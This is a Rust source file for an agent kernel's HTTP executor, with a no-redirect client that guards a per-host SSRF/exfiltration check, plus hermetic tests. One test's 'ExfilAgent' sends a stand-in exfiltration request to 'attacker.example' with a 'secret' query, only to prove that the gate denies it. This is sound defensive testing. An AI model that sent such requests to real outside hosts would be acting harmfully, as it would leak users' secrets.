//! The `Http` executor — make an HTTP request and fold the response back.
//!
//! An agent that fetches a URL emits an `Http` effect; the kernel authorizes it (the host is gated by a
//! SEC-F1 `HostIn` capability — the SSRF/exfil guard), durably dispatches it, this executor performs the
//! request, and the response folds back as the result. The effect's `target` is the URL; its `payload` is
//! a `(http-request (method <name>) (headers ((k v)…)) (body <opt>))` binary-sexpr (the kernel's
//! [`cdz_kernel::event_ast::encode_http_request`] wire convention, §9b): the METHOD is CALLER-SPECIFIED
//! (never inferred from body presence — a bodyless POST and a DELETE-with-body are both expressible), the
//! request HEADERS are caller-supplied, and the body is independent of the method. The result is a
//! `(http-response (status)(headers)(body))` binary-sexpr — STATUS + response HEADERS + BODY — so a
//! reducer can read the status code and response headers, not just the body.
//!
//! **Transport seam** (identical shape to [`crate::model`]): the real request touches the network, so
//! this executor is GENERIC over an [`HttpTransport`]. The executor owns the pure, hermetically-testable
//! effect mapping (family check, payload DECODE, method mapping, outcome mapping); the transport owns the
//! I/O (a real client — behind the crate's `live-net` feature). A stub transport drives the hermetic
//! tests + the end-to-end agent-loop test.
//!
//! **Bytes-first** (operator perf directive): both the request body and the response body are
//! [`Bytes`] — a fetched body is a hot-path buffer folded into the log/KV, so a ref-counted clone beats
//! a deep copy. **Trust boundary:** the kernel already gated the resolved URL's host (SEC-F1) before
//! dispatch; this executor does not re-authorize.

use bytes::Bytes;
use cdz_kernel::effect::{effect_ct, EffectId, EffectRequest, Payload};
use cdz_kernel::event::EffectOutcome;
use cdz_kernel::event_ast::{decode_http_request_with_headers, encode_http_response};
use cdz_kernel::executor::Executor;
use cdz_kernel::hash::Hash;

/// The HTTP method an `Http` effect carries — CALLER-SPECIFIED, never inferred from body presence (so
/// POST vs PUT vs DELETE are distinguishable, a bodyless POST and a DELETE-with-body are both
/// expressible). An OPEN sum: an unknown/extension method (`PROPFIND`, …) survives verbatim as
/// [`HttpMethod::Other`] rather than being rejected — the kernel codec returns the method name as a
/// string and does not reject unknowns (tolerant-reader posture).
#[derive(Clone, PartialEq, Eq, Debug)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Delete,
    Patch,
    Head,
    Options,
    /// Any method the codec surfaced that isn't a well-known one above — carried through verbatim.
    Other(String),
}

impl HttpMethod {
    /// Map a decoded method name to the enum. `decode_http_request_with_headers` returns the method name AS ENCODED
    /// (case preserved — the kernel does not normalize case), so this matches CASE-INSENSITIVELY on its
    /// own `to_ascii_lowercase` (a caller that encoded "GET"/"Get"/"get" all resolve to
    /// [`HttpMethod::Get`]). An unrecognized name is preserved verbatim (original case) as
    /// [`HttpMethod::Other`] (open sum — never rejected here).
    pub fn from_name(name: &str) -> Self {
        match name.to_ascii_lowercase().as_str() {
            "get" => HttpMethod::Get,
            "post" => HttpMethod::Post,
            "put" => HttpMethod::Put,
            "delete" => HttpMethod::Delete,
            "patch" => HttpMethod::Patch,
            "head" => HttpMethod::Head,
            "options" => HttpMethod::Options,
            _ => HttpMethod::Other(name.to_string()),
        }
    }

    /// The uppercase wire name a transport puts on the request line.
    pub fn as_str(&self) -> &str {
        match self {
            HttpMethod::Get => "GET",
            HttpMethod::Post => "POST",
            HttpMethod::Put => "PUT",
            HttpMethod::Delete => "DELETE",
            HttpMethod::Patch => "PATCH",
            HttpMethod::Head => "HEAD",
            HttpMethod::Options => "OPTIONS",
            HttpMethod::Other(s) => s,
        }
    }
}

/// The I/O half of an HTTP request, factored out so the executor's logic is hermetically testable. An
/// impl performs the real request (behind `live-net`); a stub returns canned bytes for tests. Total: it
/// returns `Err(reason)` rather than panicking, so a transport failure folds as an observable
/// `EffectOutcome::Err` (§9d/§17).
///
/// `method` is the caller-specified [`HttpMethod`] (the transport puts it on the request line — no
/// inference). `body` is `None` for a bodyless request and `Some(bytes)` for one with a body; the two are
/// INDEPENDENT (any method may carry or omit a body). Returns the full [`HttpResponse`] — STATUS +
/// response HEADERS + BODY, not just the body — so a reducer can branch on the status code (200 vs 404 vs
/// 500) and read response headers (content-type, …). The `idempotency_key` lets a side-effecting transport
/// dedup a crash-re-driven request (§16c-S1/D) — relevant for a non-idempotent method.
///
/// **Error classification (supervision).** `Err` is strictly a TRANSPORT-LEVEL failure (the request never
/// completed) — NOT an HTTP status: a completed request with a 4xx/5xx STATUS comes back as
/// `Ok(HttpResponse)` carrying that status, and the reducer decides what a 404/500 means, not the transport.
/// The `Err` half is a classified [`EffectOutcome`](cdz_kernel::event::EffectOutcome) carrying a typed
/// [`Retryability`](cdz_kernel::event::Retryability) — a transient failure (timeout, connection
/// reset/refused) via [`EffectOutcome::err_retryable`](cdz_kernel::event::EffectOutcome::err_retryable), a
/// permanent one (DNS failure, malformed URL, TLS error) via
/// [`EffectOutcome::err`](cdz_kernel::event::EffectOutcome::err) (`Permanent` is the fail-closed default).
/// The retryability applies to `Err` only, never to app-level statuses.
/// `#[async_trait(?Send)]` — a real HTTP request awaits the socket; not `Send` (single-threaded host).
#[async_trait::async_trait(?Send)]
pub trait HttpTransport {
    async fn request(
        &self,
        method: HttpMethod,
        url: &str,
        headers: &[(String, String)],
        body: Option<&[u8]>,
        idempotency_key: Hash,
    ) -> Result<HttpResponse, EffectOutcome>;
}

/// A completed HTTP response — the STATUS code, response HEADERS (ordered name/value pairs), and BODY. The
/// executor encodes this into the effect result as a `(http-response (status)(headers)(body))` binary-sexpr
/// (the kernel's [`cdz_kernel::event_ast::encode_http_response`] wire convention) so a reducer decodes it
/// with `decode_http_response` and can read status + headers, not just the body.
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<(String, String)>,
    pub body: Bytes,
}

/// Performs `Http` effects by delegating the request to an [`HttpTransport`]. Single-family: a non-`Http`
/// family is an observable `Err` (§9d) — register it under `Http` in a
/// [`cdz_kernel::executor::CompositeExecutor`] alongside the other real executors.
pub struct HttpExecutor<T: HttpTransport> {
    transport: T,
}

impl<T: HttpTransport> HttpExecutor<T> {
    pub fn new(transport: T) -> Self {
        HttpExecutor { transport }
    }
}

#[async_trait::async_trait(?Send)]
impl<T: HttpTransport> Executor for HttpExecutor<T> {
    async fn perform(
        &mut self,
        _id: EffectId,
        req: &EffectRequest,
        idempotency_key: Hash,
    ) -> EffectOutcome {
        // Family-keyed (seq-39), not the EffectKind enum — the same decision the router + authz make.
        if !req.content_type.matches_family(effect_ct::HTTP) {
            // Structural — PERMANENT, a supervisor must not retry it (§17: observable Err, never a panic).
            return EffectOutcome::err(format!(
                "HttpExecutor only handles the {} family, got {}",
                effect_ct::HTTP,
                req.content_type.family
            ));
        }
        // The payload is a `(http-request (method <name>) (headers ((k v)…)) (body <opt>))` binary-sexpr —
        // decode the caller-specified method + headers + body (NO body-presence heuristic). A blob-ref
        // payload can't be decoded (no blob-store handle) and a missing/garbage payload is malformed; both
        // are structural → PERMANENT.
        let (method, headers, body): (HttpMethod, Vec<(String, String)>, Option<Vec<u8>>) =
            match &req.payload {
                Some(Payload::Inline(bytes)) => match decode_http_request_with_headers(bytes) {
                    Ok((method_name, headers, body)) => {
                        (HttpMethod::from_name(&method_name), headers, body)
                    }
                    Err(e) => {
                        return EffectOutcome::err(format!(
                            "HttpExecutor: malformed http-request payload: {e:?}"
                        ));
                    }
                },
                Some(Payload::Blob(_)) => {
                    return EffectOutcome::err(
                        "HttpExecutor: blob-ref request payload unsupported — this executor has no blob-store access; inline the http-request",
                    );
                }
                None => {
                    return EffectOutcome::err(
                        "HttpExecutor: an Http effect requires an http-request payload (method + optional body)",
                    );
                }
            };
        // target = the request URL. The target is now opaque Arc<[u8]>; a URL is UTF-8, so a non-UTF-8
        // target is malformed → PERMANENT (fail-closed). The kernel's SEC-F1 HostIn gate already ran on the
        // target before dispatch; this is just the mechanical byte→str read.
        let url = match req.target_str() {
            Ok(u) => u,
            Err(_) => {
                return EffectOutcome::err(
                    "HttpExecutor: the Http target (URL) is not valid UTF-8",
                );
            }
        };
        match self
            .transport
            .request(method, url, &headers, body.as_deref(), idempotency_key)
            .await
        {
            // A completed response — encode its status + headers + body into the result as an
            // `(http-response …)` binary-sexpr so the reducer reads status/headers, not just the body. A
            // transport Err (couldn't complete) folds through with its retryability token unchanged.
            Ok(resp) => {
                let payload = encode_http_response(resp.status, &resp.headers, &resp.body);
                EffectOutcome::Ok(Some(Payload::Inline(payload.into())))
            }
            Err(outcome) => outcome,
        }
    }

    /// This single-family executor serves exactly the `Http` family — the capability-manifest mechanism
    /// dimension when it's used bare as a `dyn Executor` (in a `CompositeExecutor` the composite's own
    /// `by_family` override answers instead). Overrides the trait's fail-safe `false` default.
    fn handles_family(&self, family: &str) -> bool {
        family == effect_ct::HTTP
    }
}

/// The REAL HTTP client transport (behind `live-net`) — a thin adapter over [`reqwest`] filling the
/// [`HttpTransport`] seam the [`HttpExecutor`] already routes to. Needs no credentials (an HTTP fetch),
/// so this is the first live transport to land; the Bedrock model transport (SigV4 + creds) follows.
///
/// The kernel already gated the resolved URL's host (SEC-F1 SSRF/exfil guard) BEFORE dispatch, so this
/// does NOT re-authorize — it just performs the request. It maps a completed request (any status) to
/// `Ok(HttpResponse)` and a TRANSPORT failure to a retryability-classified `Err` (§9d/§17): a timeout or
/// connect error is `err_retryable`, a builder/decode/redirect-policy failure is `err` (Permanent).
/// Credentials come from the ambient environment where relevant (none needed here).
///
/// **Redirects are NOT followed** (SEC-F1). The kernel authorizes the host of the ORIGINAL URL; a 3xx to a
/// different host would let an authorized fetch be silently redirected to a DISALLOWED host after the
/// authz gate — an SSRF / data-exfil bypass. So the client uses [`redirect::Policy::none`]: a redirect is
/// surfaced verbatim as a 3xx `HttpResponse` (the reducer sees the `location` header + status and can
/// re-emit a NEW `Http` effect to that host, which is authorized afresh). Following a redirect must never
/// bypass the per-host capability check.
// `Clone` is cheap: `reqwest::Client` is an `Arc`-backed handle to a shared connection pool, so cloning is
// a refcount bump (NOT a new pool). This lets the daemon build ONE transport at startup and clone it into a
// fresh per-session executor without re-running client construction (#1987 review — a per-install rebuild
// stalled the single-threaded loop).
#[cfg(feature = "live-net")]
#[derive(Clone)]
pub struct ReqwestHttpTransport {
    client: reqwest::Client,
}

#[cfg(feature = "live-net")]
impl ReqwestHttpTransport {
    /// Build the transport with a client that does NOT auto-follow redirects (SEC-F1 — see the type doc:
    /// following a cross-host 3xx would bypass the kernel's per-host authz). A client build failure (e.g.
    /// no TLS backend) is a permanent host misconfiguration surfaced at construction, not per-request.
    pub fn new() -> Result<Self, String> {
        reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .map(|client| ReqwestHttpTransport { client })
            .map_err(|e| format!("failed to build the HTTP client: {e}"))
    }
}

#[cfg(feature = "live-net")]
#[async_trait::async_trait(?Send)]
impl HttpTransport for ReqwestHttpTransport {
    async fn request(
        &self,
        method: HttpMethod,
        url: &str,
        headers: &[(String, String)],
        body: Option<&[u8]>,
        _idempotency_key: Hash,
    ) -> Result<HttpResponse, EffectOutcome> {
        // Method + URL. reqwest parses the method string; an unparseable custom method (control chars,
        // spaces) is a structural PERMANENT error (the request line can't be formed).
        let reqwest_method =
            reqwest::Method::from_bytes(method.as_str().as_bytes()).map_err(|e| {
                EffectOutcome::err(format!("invalid HTTP method {:?}: {e}", method.as_str()))
            })?;
        let mut builder = self.client.request(reqwest_method, url);
        for (k, v) in headers {
            builder = builder.header(k, v);
        }
        if let Some(b) = body {
            builder = builder.body(b.to_vec());
        }

        // A transport-level failure (the request never completed) → classified Err. A COMPLETED request
        // with any status (incl. 4xx/5xx) is Ok — the reducer decides what a status means, not us.
        let resp = self
            .client
            .execute(builder.build().map_err(|e| {
                EffectOutcome::err(format!("failed to build the HTTP request: {e}"))
            })?)
            .await
            .map_err(classify_reqwest_error)?;

        let status = resp.status().as_u16();
        let resp_headers: Vec<(String, String)> = resp
            .headers()
            .iter()
            .map(|(name, value)| {
                // A header value that isn't valid UTF-8 is lossily rendered rather than dropped — a
                // reducer reading headers gets every header, and non-text values are rare on the paths an
                // agent fetches. (The status + body are unaffected.)
                (
                    name.as_str().to_string(),
                    String::from_utf8_lossy(value.as_bytes()).into_owned(),
                )
            })
            .collect();
        // The body read can itself fail mid-stream (connection dropped) — a transport failure, classified.
        let body = resp.bytes().await.map_err(classify_reqwest_error)?;

        Ok(HttpResponse {
            status,
            headers: resp_headers,
            body,
        })
    }
}

/// Classify a reqwest error into the supervision retryability token (§17). A timeout or a connect-level
/// failure is transient (the endpoint may recover) → retryable; anything else (a redirect-policy or
/// decode failure, a malformed URL that slipped the builder) is permanent by default (fail-closed).
#[cfg(feature = "live-net")]
fn classify_reqwest_error(e: reqwest::Error) -> EffectOutcome {
    if e.is_timeout() || e.is_connect() {
        EffectOutcome::err_retryable(format!("HTTP transport failure: {e}"))
    } else {
        EffectOutcome::err(format!("HTTP transport failure: {e}"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use cdz_kernel::effect::Timeliness;
    use cdz_kernel::event::Retryability;
    use cdz_kernel::event_ast::{
        decode_http_response, encode_http_request, encode_http_request_with_headers,
    };

    /// A stub transport: asserts the method/headers/body it was asked to perform, returns a canned
    /// [`HttpResponse`] (status + headers + body). Records what the executor decoded + passed through.
    struct StubHttp {
        expect_method: HttpMethod,
        expect_headers: Vec<(String, String)>,
        expect_body: Option<Vec<u8>>,
        response: HttpResponse,
    }
    #[async_trait::async_trait(?Send)]
    impl HttpTransport for StubHttp {
        async fn request(
            &self,
            method: HttpMethod,
            url: &str,
            headers: &[(String, String)],
            body: Option<&[u8]>,
            _key: Hash,
        ) -> Result<HttpResponse, EffectOutcome> {
            assert_eq!(url, "https://ok.host/x");
            assert_eq!(
                method, self.expect_method,
                "method threaded through verbatim"
            );
            assert_eq!(
                headers,
                &self.expect_headers[..],
                "request headers threaded through"
            );
            assert_eq!(body.map(|b| b.to_vec()), self.expect_body);
            Ok(self.response.clone())
        }
    }

    fn resp(status: u16, headers: &[(&str, &str)], body: &[u8]) -> HttpResponse {
        HttpResponse {
            status,
            headers: headers
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            body: Bytes::copy_from_slice(body),
        }
    }

    /// Build an Http effect (headerless http-request payload — the 2-arg encoder).
    fn http_req(method: &str, body: Option<&[u8]>) -> EffectRequest {
        EffectRequest::new_with_family(
            effect_ct::HTTP,
            "https://ok.host/x",
            Some(Payload::Inline(encode_http_request(method, body).into())),
            Timeliness::Interactive,
        )
    }

    /// Build an Http effect with request headers (the 3-arg encoder).
    fn http_req_h(method: &str, headers: &[(&str, &str)], body: Option<&[u8]>) -> EffectRequest {
        let hs: Vec<(String, String)> = headers
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        EffectRequest::new_with_family(
            effect_ct::HTTP,
            "https://ok.host/x",
            Some(Payload::Inline(
                encode_http_request_with_headers(method, &hs, body).into(),
            )),
            Timeliness::Interactive,
        )
    }

    /// Decode the executor's `(http-response …)` result payload for assertions.
    fn decode_result(out: EffectOutcome) -> (u16, Vec<(String, String)>, Vec<u8>) {
        match out {
            EffectOutcome::Ok(Some(Payload::Inline(bytes))) => {
                decode_http_response(&bytes).expect("result is a valid http-response")
            }
            other => panic!("expected Ok(Inline(http-response)), got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_get_returns_status_headers_and_body() {
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Get,
            expect_headers: vec![],
            expect_body: None,
            response: resp(200, &[("content-type", "text/plain")], b"response body"),
        });
        let (status, headers, body) = decode_result(
            exec.perform(EffectId(0), &http_req("get", None), Hash::of(b"k"))
                .await,
        );
        assert_eq!(status, 200);
        assert_eq!(
            headers,
            vec![("content-type".to_string(), "text/plain".to_string())]
        );
        assert_eq!(&body[..], b"response body");
    }

    #[tokio::test]
    async fn request_headers_thread_through_to_the_transport() {
        // Caller-supplied request headers reach the transport (asserted in the stub) + a non-200 status
        // + response headers come back readable.
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Post,
            expect_headers: vec![
                ("authorization".to_string(), "Bearer x".to_string()),
                ("content-type".to_string(), "application/json".to_string()),
            ],
            expect_body: Some(b"{}".to_vec()),
            response: resp(201, &[("location", "/new/1")], b"created"),
        });
        let (status, headers, body) = decode_result(
            exec.perform(
                EffectId(0),
                &http_req_h(
                    "post",
                    &[
                        ("authorization", "Bearer x"),
                        ("content-type", "application/json"),
                    ],
                    Some(b"{}"),
                ),
                Hash::of(b"k"),
            )
            .await,
        );
        assert_eq!(status, 201);
        assert_eq!(
            headers,
            vec![("location".to_string(), "/new/1".to_string())]
        );
        assert_eq!(&body[..], b"created");
    }

    #[tokio::test]
    async fn a_reducer_can_read_a_404_status() {
        // A completed request with a 4xx status is Ok(http-response), NOT Err — the reducer decides.
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Get,
            expect_headers: vec![],
            expect_body: None,
            response: resp(404, &[], b"not found"),
        });
        let (status, _headers, body) = decode_result(
            exec.perform(EffectId(0), &http_req("get", None), Hash::of(b"k"))
                .await,
        );
        assert_eq!(
            status, 404,
            "a 404 is a completed response, not a transport error"
        );
        assert_eq!(&body[..], b"not found");
    }

    #[tokio::test]
    async fn a_bodyless_post_and_a_delete_with_body_are_both_expressible() {
        // The point of the explicit method: the two cases the body-presence heuristic couldn't do.
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Post,
            expect_headers: vec![],
            expect_body: None,
            response: resp(200, &[], b"a"),
        });
        assert!(matches!(
            exec.perform(EffectId(0), &http_req("post", None), Hash::of(b"k"))
                .await,
            EffectOutcome::Ok(_)
        ));
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Delete,
            expect_headers: vec![],
            expect_body: Some(b"why".to_vec()),
            response: resp(200, &[], b"b"),
        });
        assert!(matches!(
            exec.perform(
                EffectId(0),
                &http_req("delete", Some(b"why")),
                Hash::of(b"k")
            )
            .await,
            EffectOutcome::Ok(_)
        ));
    }

    #[tokio::test]
    async fn an_unknown_method_survives_verbatim_as_other() {
        let mut exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Other("propfind".to_string()),
            expect_headers: vec![],
            expect_body: None,
            response: resp(207, &[], b"x"),
        });
        assert!(matches!(
            exec.perform(EffectId(0), &http_req("propfind", None), Hash::of(b"k"))
                .await,
            EffectOutcome::Ok(_)
        ));
    }

    #[tokio::test]
    async fn a_blob_payload_is_a_permanent_err_no_blob_store_access() {
        struct NeverCalled;
        #[async_trait::async_trait(?Send)]
        impl HttpTransport for NeverCalled {
            async fn request(
                &self,
                _m: HttpMethod,
                _u: &str,
                _h: &[(String, String)],
                _b: Option<&[u8]>,
                _k: Hash,
            ) -> Result<HttpResponse, EffectOutcome> {
                panic!("transport must not be called for a blob-ref payload");
            }
        }
        let mut exec = HttpExecutor::new(NeverCalled);
        let req = EffectRequest::new_with_family(
            effect_ct::HTTP,
            "https://ok.host/x",
            Some(Payload::Blob(Hash::of(b"big"))),
            Timeliness::Interactive,
        );
        match exec.perform(EffectId(0), &req, Hash::of(b"k")).await {
            EffectOutcome::Err {
                message,
                retryability,
            } => {
                assert!(message.contains("no blob-store access"), "{message}");
                assert_eq!(retryability, Retryability::Permanent, "{message}");
            }
            other => panic!("expected Err for a blob-ref payload, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_missing_or_malformed_payload_is_a_permanent_err() {
        struct NeverCalled;
        #[async_trait::async_trait(?Send)]
        impl HttpTransport for NeverCalled {
            async fn request(
                &self,
                _m: HttpMethod,
                _u: &str,
                _h: &[(String, String)],
                _b: Option<&[u8]>,
                _k: Hash,
            ) -> Result<HttpResponse, EffectOutcome> {
                panic!("transport must not be called for a malformed request");
            }
        }
        let mut exec = HttpExecutor::new(NeverCalled);
        let no_payload = EffectRequest::new_with_family(
            effect_ct::HTTP,
            "https://ok.host/x",
            None,
            Timeliness::Interactive,
        );
        match exec.perform(EffectId(0), &no_payload, Hash::of(b"k")).await {
            EffectOutcome::Err {
                message,
                retryability,
            } => {
                assert!(message.contains("http-request payload"), "{message}");
                assert_eq!(retryability, Retryability::Permanent, "{message}");
            }
            other => panic!("expected Err for a missing payload, got {other:?}"),
        }
        let mut exec = HttpExecutor::new(NeverCalled);
        let garbage = EffectRequest::new_with_family(
            effect_ct::HTTP,
            "https://ok.host/x",
            Some(Payload::Inline(b"not a sexpr".to_vec().into())),
            Timeliness::Interactive,
        );
        match exec.perform(EffectId(0), &garbage, Hash::of(b"k")).await {
            EffectOutcome::Err {
                message,
                retryability,
            } => {
                assert!(message.contains("malformed"), "{message}");
                assert_eq!(retryability, Retryability::Permanent, "{message}");
            }
            other => panic!("expected Err for a garbage payload, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_transient_transport_failure_stays_retryable_through_the_executor() {
        struct FlakyHttp;
        #[async_trait::async_trait(?Send)]
        impl HttpTransport for FlakyHttp {
            async fn request(
                &self,
                _m: HttpMethod,
                _u: &str,
                _h: &[(String, String)],
                _b: Option<&[u8]>,
                _k: Hash,
            ) -> Result<HttpResponse, EffectOutcome> {
                Err(EffectOutcome::err_retryable("connection refused"))
            }
        }
        let mut exec = HttpExecutor::new(FlakyHttp);
        match exec
            .perform(EffectId(0), &http_req("get", None), Hash::of(b"k"))
            .await
        {
            EffectOutcome::Err {
                message,
                retryability,
            } => {
                assert!(message.contains("connection refused"), "{message}");
                assert_eq!(retryability, Retryability::Retryable, "{message}");
            }
            other => panic!("expected the transport error to fold as Err, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_non_http_family_is_a_permanent_err() {
        struct NeverCalled;
        #[async_trait::async_trait(?Send)]
        impl HttpTransport for NeverCalled {
            async fn request(
                &self,
                _m: HttpMethod,
                _u: &str,
                _h: &[(String, String)],
                _b: Option<&[u8]>,
                _k: Hash,
            ) -> Result<HttpResponse, EffectOutcome> {
                panic!("transport must not be called for a non-http-family effect");
            }
        }
        let mut exec = HttpExecutor::new(NeverCalled);
        let req =
            EffectRequest::new_with_family(effect_ct::MODEL, "m", None, Timeliness::Interactive);
        match exec.perform(EffectId(0), &req, Hash::of(b"k")).await {
            EffectOutcome::Err {
                message,
                retryability,
            } => {
                assert!(
                    message.contains(effect_ct::HTTP) && message.contains(effect_ct::MODEL),
                    "err names the handled (http) + rejected (model) families: {message}"
                );
                assert_eq!(retryability, Retryability::Permanent, "{message}");
            }
            other => panic!("expected Err for a non-http-family effect, got {other:?}"),
        }
    }

    #[test]
    fn handles_only_the_http_family() {
        let exec = HttpExecutor::new(StubHttp {
            expect_method: HttpMethod::Get,
            expect_headers: vec![],
            expect_body: None,
            response: resp(200, &[], b""),
        });
        assert!(exec.handles_family(effect_ct::HTTP));
        assert!(!exec.handles_family(effect_ct::NOW));
        assert!(!exec.handles_family(effect_ct::MODEL));
        assert!(!exec.handles_family("embedding"));
    }

    // ---- an agent RUNS a fetch loop end-to-end through the HttpExecutor (converted from the deleted
    // http_agent_e2e integration test, operator no-integration-tests mandate — hermetic: a Session + a Rust
    // reducer + the real HttpExecutor over a STUB transport, no network). Beyond the isolated
    // effect-mapping units above: proves the reducer's Http effect drives the loop (fold → authorize →
    // dispatch → EXECUTE → fold-result), the response body advances the agent, replay reconstructs the
    // identical KV, and a SEC-F1 host-scoped grant denies an off-host fetch BEFORE the client. ----
    use cdz_kernel::authz::Authorizer;
    use cdz_kernel::effect::{Capability, EffectKind, ResourcePredicate};
    use cdz_kernel::event::{ContentType, Event, EventBody};
    use cdz_kernel::executor::CompositeExecutor;
    use cdz_kernel::kernel::Session;
    use cdz_kernel::kv::Kv;
    use cdz_kernel::reducer::{FoldOutput, Reducer};

    /// A canned-200 transport for the fetch loop (distinct from the effect-mapping `StubHttp` above): returns
    /// `fetched <url>` as the body so the agent can read it back. Asserts the reducer emitted a GET.
    struct CannedHttp;
    #[async_trait::async_trait(?Send)]
    impl HttpTransport for CannedHttp {
        async fn request(
            &self,
            method: HttpMethod,
            url: &str,
            _headers: &[(String, String)],
            _body: Option<&[u8]>,
            _key: Hash,
        ) -> Result<HttpResponse, EffectOutcome> {
            assert_eq!(method, HttpMethod::Get, "the reducer emitted a GET");
            Ok(HttpResponse {
                status: 200,
                headers: vec![("content-type".to_string(), "text/plain".to_string())],
                body: format!("fetched {url}").into_bytes().into(),
            })
        }
    }

    /// A minimal agent that fetches a URL: on "go" it emits an `Http` effect; when the response comes back it
    /// decodes the http-response, stashes the status + body, and marks itself `fetched`.
    struct FetchAgent;
    #[async_trait::async_trait(?Send)]
    impl Reducer for FetchAgent {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            match &event.body {
                EventBody::Inbound { .. } => {
                    kv.put(b"phase".to_vec(), b"fetching".to_vec());
                    FoldOutput::with(vec![EffectRequest::new_with_family(
                        effect_ct::HTTP,
                        "https://ok.host/data",
                        Some(Payload::Inline(encode_http_request("get", None).into())),
                        Timeliness::Interactive,
                    )])
                }
                EventBody::EffectResult {
                    result: EffectOutcome::Ok(Some(Payload::Inline(payload))),
                    ..
                } => {
                    let (status, _headers, body) =
                        decode_http_response(payload).expect("result is a valid http-response");
                    kv.put(b"status".to_vec(), status.to_string().into_bytes());
                    kv.put(b"body".to_vec(), body);
                    kv.put(b"phase".to_vec(), b"fetched".to_vec());
                    FoldOutput::none()
                }
                _ => FoldOutput::none(),
            }
        }
    }

    fn fetch_go() -> EventBody {
        EventBody::Inbound {
            content_type: ContentType {
                family: "message".into(),
                version: 1,
            },
            payload: Payload::Inline(b"go".to_vec().into()),
        }
    }

    /// Grant `Http` scoped to the one host (SEC-F1 SSRF/exfil guard — deny everything else).
    fn host_cap() -> Authorizer {
        Authorizer::new(vec![Capability {
            kind: EffectKind::Http,
            predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
        }])
    }

    #[tokio::test]
    async fn agent_loop_runs_end_to_end_through_the_http_executor() {
        let mut reducer = FetchAgent;
        let mut exec = CompositeExecutor::new()
            .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(CannedHttp)));
        let mut session = Session::genesis(
            Hash::of(b"fetch-agent-v1"),
            Hash::of(b"fetch-agent-v1-nonce"),
        );

        session
            .deliver(fetch_go(), None, &mut FetchAgent, &host_cap(), &mut exec)
            .await
            .unwrap();

        // The loop closed: the agent fetched, the executor performed the request, and the response body
        // folded back and advanced the agent to `fetched`.
        assert_eq!(session.kv().get(b"phase"), Some(&b"fetched"[..]));
        assert_eq!(
            String::from_utf8_lossy(session.kv().get(b"body").expect("body recorded")),
            "fetched https://ok.host/data"
        );
        assert_eq!(session.open_effects(), 0);

        // Replay-equivalence: the response is recorded, so replay reconstructs the identical KV without
        // re-fetching.
        let replayed = Session::replay(session.log().to_vec(), &mut reducer)
            .await
            .unwrap();
        assert_eq!(replayed.snapshot().kv_root, session.snapshot().kv_root);
    }

    #[tokio::test]
    async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
        // Deny-by-default / SEC-F1: the grant is for `ok.host`; an agent fetching a DIFFERENT host (an
        // exfil/SSRF attempt) is denied at the gate — the client (a real network call) is never reached. A
        // transport that panics if called proves the executor was never consulted.
        struct MustNotCall;
        #[async_trait::async_trait(?Send)]
        impl HttpTransport for MustNotCall {
            async fn request(
                &self,
                _m: HttpMethod,
                _u: &str,
                _h: &[(String, String)],
                _b: Option<&[u8]>,
                _k: Hash,
            ) -> Result<HttpResponse, EffectOutcome> {
                panic!("a denied Http effect must never reach the client");
            }
        }
        struct ExfilAgent;
        #[async_trait::async_trait(?Send)]
        impl Reducer for ExfilAgent {
            async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
                if matches!(event.body, EventBody::Inbound { .. }) {
                    FoldOutput::with(vec![EffectRequest::new_with_family(
                        effect_ct::HTTP,
                        "https://attacker.example/exfil?d=secret",
                        None,
                        Timeliness::Interactive,
                    )])
                } else {
                    FoldOutput::none()
                }
            }
        }
        let mut exec = CompositeExecutor::new()
            .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(MustNotCall)));
        let mut session = Session::genesis(
            Hash::of(b"exfil-agent-v1"),
            Hash::of(b"exfil-agent-v1-nonce"),
        );
        session
            .deliver(fetch_go(), None, &mut ExfilAgent, &host_cap(), &mut exec)
            .await
            .unwrap();

        // Denied at the gate → a denial is on the log and nothing left open.
        assert!(session
            .log()
            .iter()
            .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
        assert_eq!(session.open_effects(), 0);
    }
}
